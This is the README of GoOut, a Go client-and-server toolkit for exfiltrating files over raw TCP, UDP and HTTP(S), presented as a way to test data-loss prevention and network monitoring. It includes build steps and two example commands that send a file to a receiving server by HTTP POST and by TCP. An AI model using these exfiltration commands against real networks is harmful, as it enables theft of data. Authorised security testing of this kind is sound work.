# GoOut
GoOut is a toolkit to perform data exfiltration using a variety of different channels. This tool should help identify possible DLP gaps and test network monitoring capabilities.

I initially created GoOut as a project to learn Go. It also provides the benefit of easily compiling for multiple architectures. I also wanted a tool that not only had the client code but also an easy server implementation. Instead of having to stand up different individual services on a machine, having one application that can handle all the protocols makes it easier to deploy.

## List of Techniques
GoOut currently supports the following protocols:

* Raw TCP
* Raw UDP
* HTTP(S)
    * POST request
    * Multiple GET requests

## Install
If you already have Go installed, all you need to do is clone the repository and build the client and server code.

* git clone https://github.com/lum8rjack/GoOut.git
* cd into the client directory
* go build GoOut.go
* cd into the server directory
* go build server.go

### Docker
Docker files have also been created if you would prefer not to install Go. The docker files will build the binaries for you depending on which architecture you choose. By default, it will build the Linux binaries but you can change the comments in the Dockerfile to build for other architectures.

## Configuration
The server binary uses a config.json file (located in the server/config directory) to determine which services start and ports to listen on. You can change the ports or enable/dissable services depending on the testing you are performing.

NOTE: Currently the http and https servers cannot be ran as the same time.

By default, the server also logs connections that are made and when uploads have been received. The file and location can be changed in the config.json file as well.

## Usage
On the server, run the binary and it should read in the configuration file and start the services. For the client you need to provide the file and details of the module (protocol) you want to use. When the server receives the file it will save it to the server/uploads directory.

### Example
To sent a file over http via a POST request:

~~~
./GoOut -file Dockerfile -module web,post,http://127.0.0.1/upload
~~~

To send a file over TCP via port 8080:

~~~
./GoOut -file Dockerfile -module socket,tcp,127.0.0.1:8080
~~~

## Future Updates
I plan to include additional protocols in the future.

* POP3/SMTP
* Websockets
* DNS
* ICMP

## Disclaimer
This program should only be used on environments and networks that you own or have explicit permission to do so. The authors will be held liable for any illegal use of this program.